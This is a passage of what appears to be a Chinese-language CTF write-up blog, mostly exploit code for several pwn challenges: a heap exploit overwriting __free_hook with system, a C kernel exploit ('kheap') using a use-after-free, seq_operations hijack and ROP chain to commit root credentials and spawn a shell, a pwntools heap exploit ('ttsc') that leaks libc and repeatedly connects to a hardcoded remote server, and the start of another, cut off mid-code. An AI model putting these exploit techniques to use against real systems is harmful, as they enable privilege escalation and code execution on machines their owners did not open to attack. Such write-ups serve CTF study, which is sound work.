class="hljs-number">7</span> + p32(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">7</span>) + p64(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">7</span>)<br>send_command(<span class="hljs-string">b&#x27;touch flag3&#x27;</span>)<br>p.sendline(payload)<br><br>send_command(<span class="hljs-string">b&#x27;ln flag3 flag4&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;rm flag3&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;cat flag4&#x27;</span>)<br>leak_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(leak_addr))<br>malloc_hook = leak_addr - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(malloc_hook))<br>libc_base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> + p32(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">7</span>) + <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x40</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0xf8</span> + p64(free_hook)<br>send_command(<span class="hljs-string">b&#x27;gedit flag4&#x27;</span>)<br>p.sendline(payload)<br><br>send_command(<span class="hljs-string">b&#x27;touch flag5&#x27;</span>)<br>p.sendline(p64(sys_addr))<br>send_command(<span class="hljs-string">b&#x27;rm flag1&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="kheap"><a href="#kheap" class="headerlink" title="kheap"></a>kheap</h1><p>æ”»å‡»æ€è·¯ï¼š</p><ol><li>ä½¿ç”¨0x10002è¿™ä¸ªé€‰é¡¹æ—¶ç›´æ¥å¤åˆ¶å †åœ°å€ï¼Œé‡Šæ”¾å †å—åselectä¸­å­˜äº†å †åœ°å€ï¼Œé€ æˆuafã€‚</li><li>ä½¿ç”¨seq_fileï¼Œå…¶æ­£å¥½ä¼šä½¿ç”¨0x20å¤§å°çš„å †å—ï¼Œç›´æ¥readå°±å¯ä»¥æ³„æ¼å†…æ ¸åœ°å€ã€‚</li><li>writeä¿®æ”¹seq_operationsçš„å†…å®¹ï¼Œå¹¶ç»™ç›¸åº”çš„å¯„å­˜å™¨å¤åˆ¶æ„é€ ROPï¼Œæœ€åè°ƒç”¨readçš„ç³»ç»Ÿè°ƒç”¨ã€‚</li></ol><p>å®Œæ•´exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-number">0xffffffff810ce710</span>;<br><span class="hljs-type">size_t</span> prepare_kernel_cred = <span class="hljs-number">0xffffffff810cebf0</span>;<br><span class="hljs-type">size_t</span> init_cred = <span class="hljs-number">0xffffffff82c6b920</span>;<br><span class="hljs-type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="hljs-number">0xffffffff81c00fb0</span>;<br><br><span class="hljs-type">size_t</span> add_rsp_0x1a8_ret = <span class="hljs-number">0xffffffff817d1e76</span>;<br><span class="hljs-type">size_t</span> pop_rdi_ret = <span class="hljs-number">0xffffffff8102517a</span>;<br><span class="hljs-type">size_t</span> kernel_offset;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-type">void</span> *buf;<br>&#125;;<br><br><span class="hljs-type">int</span> kheap_fd, seq_fd;<br><span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x10</span>];<br><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Status has been saved. \n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Process binded to core %d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_shell</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">if</span>(getuid())&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed to get the root!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span> <span class="hljs-title">a</span>;</span><br>    a.idx = idx;<br>    ioctl(kheap_fd, <span class="hljs-number">0x10000</span>, &amp;a);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">del</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span> <span class="hljs-title">a</span>;</span><br>    a.idx = idx;<br>    ioctl(kheap_fd, <span class="hljs-number">0x10001</span>, &amp;a);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mov</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span> <span class="hljs-title">a</span>;</span><br>    a.idx = idx;<br>    ioctl(kheap_fd, <span class="hljs-number">0x10002</span>, &amp;a);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">gift</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx , <span class="hljs-type">void</span> *buf)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">info</span> <span class="hljs-title">a</span> =</span> &#123;idx, buf&#125;;<br>    ioctl(kheap_fd, <span class="hljs-number">0x6666</span>, &amp;a);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    save_status();<br>    bind_core(<span class="hljs-number">0</span>);<br>    <br>    kheap_fd = open(<span class="hljs-string">&quot;/dev/kheap&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(kheap_fd &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed to open!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    add(<span class="hljs-number">0</span>);<br>    mov(<span class="hljs-number">0</span>);<br>    del(<span class="hljs-number">0</span>);<br><br>    seq_fd = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(seq_fd &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed to open!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    read(kheap_fd, buf, <span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak_addr_is 0x%lx\n&quot;</span>, buf[<span class="hljs-number">0</span>]);<br>    kernel_offset = buf[<span class="hljs-number">0</span>] - <span class="hljs-number">0xffffffff8133f980</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;kernel_offset_is 0x%lx\n&quot;</span>, kernel_offset);<br>    buf[<span class="hljs-number">0</span>] = add_rsp_0x1a8_ret + kernel_offset;<br>    <br>    write(kheap_fd, buf, <span class="hljs-number">8</span>);<br><br>    pop_rdi_ret += kernel_offset;<br>    init_cred += kernel_offset;<br>    commit_creds += kernel_offset;<br>    swapgs_restore_regs_and_return_to_usermode = swapgs_restore_regs_and_return_to_usermode + <span class="hljs-number">10</span> + kernel_offset;<br><br>    __asm__(<br>    <span class="hljs-string">&quot;mov r15,  0;&quot;</span><br>    <span class="hljs-string">&quot;mov r14,  0;&quot;</span><br>    <span class="hljs-string">&quot;mov r13,  pop_rdi_ret;&quot;</span><br>    <span class="hljs-string">&quot;mov r12,  init_cred;&quot;</span><br>    <span class="hljs-string">&quot;mov rbp,  commit_creds;&quot;</span><br>    <span class="hljs-string">&quot;mov rbx,  swapgs_restore_regs_and_return_to_usermode;&quot;</span><br>    <span class="hljs-string">&quot;xor rax,  rax;&quot;</span><br>    <span class="hljs-string">&quot;mov rdx,  8;&quot;</span><br>    <span class="hljs-string">&quot;mov rsi,  rsp;&quot;</span><br>    <span class="hljs-string">&quot;mov rdi,  seq_fd;&quot;</span><br>    <span class="hljs-string">&quot;syscall&quot;</span><br>    );<br><br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ttsc"><a href="#ttsc" class="headerlink" title="ttsc"></a>ttsc</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;ttsc&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./ttsc&#x27;)</span><br><span class="hljs-keyword">global</span> p<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;chs:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.send(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;chs:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;chs:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content:&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;name?&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">8</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;age?&#x27;</span>, <span class="hljs-string">b&#x27;111&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;high?&#x27;</span>, <span class="hljs-string">b&#x27;666&#x27;</span>)<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">2</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">3</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x31</span>))<br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">1</span>)<br>    delete(<span class="hljs-number">3</span>)<br>    delete(<span class="hljs-number">2</span>)<br><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>, <span class="hljs-number">8</span>):<br>        add(<span class="hljs-number">0</span>, i * <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>        add(<span class="hljs-number">1</span>, i * <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>        add(<span class="hljs-number">2</span>, i * <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>        add(<span class="hljs-number">3</span>, i * <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>        delete(<span class="hljs-number">3</span>)<br>        delete(<span class="hljs-number">2</span>)<br>        delete(<span class="hljs-number">1</span>)<br>        delete(<span class="hljs-number">0</span>)<br><br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x18</span> + <span class="hljs-string">b&#x27;\x51&#x27;</span><br>    edit(<span class="hljs-number">1</span>, payload)<br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">1</span>)<br><br>    payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x31</span>) + <span class="hljs-string">b&#x27;\xf0&#x27;</span> <br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x40</span>, payload)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">2</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">3</span>, <span class="hljs-number">0x20</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x4c1</span>))<br><br>    delete(<span class="hljs-number">1</span>)<br>    delete(<span class="hljs-number">0</span>)<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">1</span>)<br>    delete(<span class="hljs-number">3</span>)<br>    delete(<span class="hljs-number">2</span>)<br><br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;\x60&#x27;</span> + <span class="hljs-string">b&#x27;\x57&#x27;</span>)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>    add(<span class="hljs-number">2</span>, <span class="hljs-number">0x50</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>, timeout=<span class="hljs-number">1</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1150</span><br>    libc_base = leak - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>    free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br><br>    delete(<span class="hljs-number">0</span>)<br>    payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x31</span>) + p64(free_hook)<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x40</span>, payload)<br>    delete(<span class="hljs-number">0</span>)<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>    add(<span class="hljs-number">3</span>, <span class="hljs-number">0x20</span>, p64(sys_addr))<br>    delete(<span class="hljs-number">0</span>)<br>    p.interactive()<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#p = process(&#x27;./ttsc&#x27;)</span><br>        p = remote(<span class="hljs-string">&#x27;121.40.89.206&#x27;</span>, <span class="hljs-number">20111</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br></code></pre></td></tr></table></figure><h1 id="three-edit"><a href="#three-edit" class="headerlink" title="three_edit"></a>three_edit</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn4&#x27;</span>)<br><span class="hljs-comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span><br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./pwn4&#x27;, aslr=False)</span><br><span class="hljs-keyword">global</span> p<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;content:&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    add(<span class="hljs-number">2</span>, <span class="hljs-number">0x50</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> + p64(<span class="hljs-number">0x61</span>))<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    delete(<span class="hljs-number">2</span>)<br>    delete(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):<br>        add(i, <span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    delete(<span class="hljs-number">4</span>)<br>    delete(<span class="hljs-number">3</span>)<br>    delete(<span 